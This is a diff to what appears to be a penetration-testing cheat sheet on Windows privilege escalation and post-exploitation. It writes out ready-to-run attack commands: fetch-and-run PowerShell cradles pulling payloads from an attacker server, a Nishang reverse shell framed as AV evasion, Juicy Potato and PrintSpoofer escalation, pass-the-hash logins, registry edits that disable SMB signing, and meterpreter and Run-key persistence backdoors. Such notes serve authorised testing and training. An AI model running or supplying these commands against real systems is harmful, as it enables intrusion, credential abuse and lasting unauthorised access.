+[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
+
+```powershell
+#PROCMON
+    Transfer ProcMon64 to target
+    Using Process Monitor (ProcMon64)
+    Create ProcMon filter for specific executable 'RegSrvc.exe' as an example
+    Create ProcMon filter for 'NAME NOT FOUND' for 'Result' column
+    
+    Identify where application is looking for DLL in a directory
+    Identify what DLL is missing
+    
+    Drop .dll payload in writable directory
+    restart Service, re-launch app or wait for reboot.
+
+# Determine if folder access allows WRITE
+    get-ACL 'c:/users/administrator/desktop/dvta/bin/release/' | format-list
+
+```
+
+```powershell
+#OPTIONS TO TRANSFER FILES TO VICTIM
+	sudo python3 http.server 80                                                                               :[attacker] Setup server in directory to feed file on port 80
+	
+	#CMD
+	certutil -urlcache -f http://$RHOST/$program.exe %tmp%/$program.exe                                             :Download locally, place in %tmp% folder
+	
+	#POWERSHELL
+	iex (New-Object Net.WebClient).DownloadString('http://10.10.16.2/$program.ps1')                                 :Load direct to Memory
+	Invoke-WebRequest -Uri "http://10.10.16.2/$program.ps1" -OutFile "path/to/folder/$program.ps1"                  :Download locally, same as 'wget'
+	ivr -Uri $RHOST/$program.exe -OutFile $program.exe                                                              :Short method of Invoke-WebRequest
+	(New-Object System.Net.WebClient).DownloadFile("http://10.10.16.2/$program.ps1", "path/to/folder/$program.ps1") :Download locally
+```
 
 **Skeleton Code Template for Malicious DLL**
 
@@ -6983,6 +7820,7 @@ or C:\Windows\Path\To\Exe without quotes which means that the service will look 
 **Note:** the way it is looking is to search for the next part of the directory but windows automatically appends .exe:
 
 **METHODOLOGY**
+
 > -  **Locate Writeable Path:** C:\Program Files\{Writeable Folder}\Common Files
 > - **Search Pattern:** C:\Program Files\Writeable.exe then Folder.exe then C:\Program Files\{Writeable Folder}\Common.exe etc...
 > - So if we want to inject our own code i.e Reverse shell, we would place it inside the **Writeable Folder** and rename the file to **Common.exe** so it gets picked up
@@ -6991,19 +7829,25 @@ or C:\Windows\Path\To\Exe without quotes which means that the service will look 
 
 Knowing this, finding unquoted server paths means we can also look at the route taken and find out if any of those subfolders has write permissions for our limited user.
 
-|                                                           | Desciption                                                                             |
-|:--------------------------------------------------------- |:-------------------------------------------------------------------------------------- |
-| @ **Syntax**                                              | ---                                                                                    |
-| ` wmic service get name,displayname,pathname,startmode`   | Display the services and their paths etc                                               |
-| `sc qc {service name}`                                    | Get specific info about that service. **Note** this command only works with CMD        |
-|                                                           |                                                                                        |
-| @ **accesschk64**                                         | ---                                                                                    |
-| `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"` | Using a program **Accesschk64** to discover and check if a path or folder is writeable |
-|                                                           |                                                                                        |
-| @ **Download Payload**                                    | ---                                                                                    |
-| `wget "http://{ip address}/attack.exe" -O attack.exe`     | Setup python server and download the relevant payload such as a reverse shell          |
-| =========================================                 | =========================================                                              |
+```powershell
+#FIND SERVICES UNQUOTED PATH
+    wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
 
+#START & STOP SERVICE
+    sc stop $SERVICE
+    sc start $SERVICE            :Confirms we can stop and start services without errors
+    sc qc $SERVICE               :Display specific service info; Confirms what service will start under i.e 'SERVICE_START_NAME: LocalSystem'
+
+#WRITEABLE FOLDER
+    icacls  "$PATH"              :Check specific folder if writable. '(M) under Authenticated Users'
+    #ACCESSCHECK
+        .\accesschk64.exe /accepteula -uwdq "C:\Program Files\"          :Use program to discover and check folder or path is writeable
+
+#METASPLOIT Modules
+    use exploit/windows/local/trusted_service_path            :Auto exploit instances of unquoted path instances
+    #Exploit/Multi/Handler
+        set AutoRunScript migrate -n svchost.exe              :Attempt to auto migrate before meterpreter shell becomes unstable. Only required if the shell is unstable/timing out
+```
 
 [Back to Top](#table-of-contents)
 
@@ -7164,7 +8008,7 @@ The privileges of an account(which are either given to the account when created 
     SeTakeOwnershipPrivilege
     SeDebugPrivilege
 
-**INCOGNITO**
+**Metasploit: INCOGNITO**
 
 Incognito functions similar to how we steal and impersonate with web cookies by replaying that temporary key when we are logging in.
 __Rotten Potato__ is another module you may run in conjunction with incognito. Initially there may not be any impersonation tokens available for incognito however using __Rotten Potato__ may produce a temporary one that you can quickly impersonate.
@@ -7182,6 +8026,8 @@ __Rotten Potato__ is another module you may run in conjunction with incognito. I
     metasploit		:migrate $PID
 
 ```
+
+**Binary 1: Incognito.exe**
 
 ```powershell
 #MANUAL
@@ -7202,11 +8048,51 @@ __Rotten Potato__ is another module you may run in conjunction with incognito. I
 
 Then you can login your new user with RDP or ssh and access the privileged files.
 
+**Binary 2: Juicy Potato**
+
+{CLSID}      : Serial number that represents a unique ID for application. Default is below, can find others [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
+
+```powershell
+#TRANSFER
+	sudo python SimpleHTTPServer 80                                        :[attacker] Setup server in directory to feed file on port 80
+	certutil -urlcache -f http://$RHOST/jp.exe %tmp%/jp.exe                :[victim] Download file from attacker server, place in %tmp% folder
+	wget "https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe"       :32bit
+    wget "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"                         :64bit
+
+#SETUP LISTENER
+    nc -lvnp 4444
+
+#OPTIONS
+    -l $RHOST
+    -p $NAME
+    -c {CLSID}      : Serial number that represents a unique ID for application. Default is below, can find others [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
+#USAGE
+    juicy.exe -l 1337 -p shell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
+
+```
+
+**Binary 3: PrintSpoofer**
+
+```powershell
+#TRANSFER
+	sudo python SimpleHTTPServer 80                                        :[attacker] Setup server in directory to feed file on port 80
+	certutil -urlcache -f http://$RHOST/printspoofer.exe %tmp%/printspoofer.exe                :[victim] Download file from attacker server, place in %tmp% folder
+	certutil -urlcache -f http://$RHOST/shell.exe %tmp%/shell.exe                :[victim] Download file from attacker server, place in %tmp% folder
+    #Transfer binary & reverse shell into same folder
+    
+#SETUP LISTENER
+    nc -lvnp 4444
+
+#USAGE
+    printspoofer.exe -c shell.exe
+    
+```
+
 [Back to Top](#table-of-contents)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-## Applocker Bypass
+## Applocker-Bypass
 
 ![](https://i.imgur.com/qpugWA4.png)
 
@@ -7221,20 +8107,35 @@ If Applocker is configured with default rules, then the following directory is *
 
 [Back to Top](#table-of-contents)
 
+---
+
+## Nishang-Scripts
+
+[Nishang-Github](https://github.com/samratashok/nishang)
+
+Nishang scripts are flagged by AV as malicious, the scripts are menat to be used in memory and is simple to do with powershell.
+
+```powershell
+#RUN FROM MEMORY - AV EVASION
+    #POWERSHELL
+    powershell iex (New-Object Net.WebClient).DownloadString('http://$RHOST/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+    powershell iex (New-Object Net.WebClient).DownloadString('http://$RHOST/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $RHOST -Port $PORT
+    
+    #CMD
+    powershell.exe -nop -ep bypass -C iex (New-Object Net.WebClient).DownloadString('http://$RHOST/Invoke-SessionGopher.ps1'); Invoke-SessionGopher
+
+#USEFUL
+    #GATHER
+    Invoke-SessionGopher.ps1
+```
+
+
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Working-with-Exploits
 
 ## Linux-Exploits
-
-For linux exploits first we need to compile the exploit and make the new document **executable** such as:
-
-> - `gcc {exploitname.c} -o {new name}`
-> - `chmod +x {new name}`
-
-To run:
-
-> - `./{new name}`
 
 Sometimes the target machine is 32bit and cannot accept 64bit compiled binary. As such you need to see what architecture you are dealing with.\
 32bit is represented by `i686` usually and 64bit represented by `x86_64`.
@@ -7264,7 +8165,106 @@ Popular windows exploits such as `MS11-080` are written in python and to use the
 
 [Back to Top](#table-of-contents)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+## Pass-The-Hash
+
+Maintaining persistence with pass-the-hash methods allowing easier access without further exploitation.
+
+```powershell
+#PASS-THE-HASH METHODS
+
+#PSEXEC, Metasploit
+    exploit/windows/smb/psexec      :Requires administrator shares
+        set smbpass $HASH
+        set smbuser $USER           :ie. ELS, john, administrator
+        set payload windows/meterpreter/reverse_tcp
+        set lhost
+        set rhost
+
+
+
+#A Few Pass-the-Hash methods
+    #HASH DUMP: aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
+    impacket-wmiexec.py -hashes '00000000000000000000000000000000:fc525c9683e8fe067095ba2ddc971889' administrator@10.10.10.10              :Note have to replace front part of NTLM hash wih 0 to make this work
+    evil-winrm -u Administrator -H '2b576acbe6bcfda7294d6bd18041b8fe' -i 10.10.10.10
+    xfreerdp /u:Administrator /pth:2b576acbe6bcfda7294d6bd18041b8fe /v:10.10.10.10
+```
+
+**Enable PSEXEC to be exploitable**
+
+In the event that there is a missing administrative share, then the following can be used to enable PSEXEC to be successfully exploited.
+
+Be aware that it is possible to be 'administrator' and not have true administration rights. If that is the case then the psexec module will get a `status_access_denied` and a indication that **registry changes are required for this to work.**
+
+- Actual Administrator rights are with **RID-500**
+
+```powershell
+#CHANGING REGISTRY LOCATIONS
+    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+        #Add DWORD (32bit) named LocalAccountTokenFilterPolicy and set value to 1
+    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters
+        #Add DWORD (32bit) named RequireSecuritySignature and set its value to 0
+
+#CHANGING REGISTRY POWERSHELL
+    Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord      :Allow non RID-500 user accounts to successfully pass-the-hash in some cases
+    Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord
+
+#CHANGING REGISTRY CMD
+    reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequreSecuritySignature /t REG_DWORD /d 0 /f
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f         :Allow non RID-500 user accounts to successfully pass-the-hash in some cases
+```
+
+**Enable RDP Service**
+
+In the event that RDP is disabled then it is possible to attempt to enable it.
+
+```powershell
+#CHECK RUNNING SERVICE
+    net start                                                                        :List running services
+    wmic service where 'Caption like "Remote%" and started=true' get Caption         :Search for "Remote" string of services such as Remote Desktop
+
+#ENABLE RDP WITH METERPRETER
+    run getgui -e                :Enable RDP
+    run getgui -u $user -p $pass :Add new user
+
+#ENABLE USER RDP PRIVS WITH CMD
+    net localgroup "Remote Desktop Users" john_doe /add                               :Add user to the localgroup to allow RDP access
+```
+
+---
+
+## Backdoors
+
+Variety of backdoors to allow the host to connect to a listening port.
+
+**Windows Only**
+
+The following is a meterpreter module that works for windows only. The meterpreter module creates the payload, uploads the backdoor file & executes it; finally it adds the entry to the Windows Registry. This is done automatically with using the metasploit module.
+
+Alternative there is also the manual method.
+
+```powershell
+#METERPRETER
+    -A                 :Start handler on [local] machine
+    -X                 :Start agent at boot, 'requires system privs on [victim]'
+    -i 5               :Connection attempt each 5 seconds
+    -p 8080            :Port for connect back
+    -r $RHOST          :[attacker] ip address
+    run persistence -h
+
+    run persistence -A -X -i 5 -p 8080 -r 192.168.102.147
+
+#MANUAL
+    msfvenom $exploit
+    upload /root/my_backdoor.exe c:\\windows\       :Upload backdoor to [victim]
+    reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\my_backdoor.exe" -v backdoor_name
+
+```
+
+
+
+
 
 
 
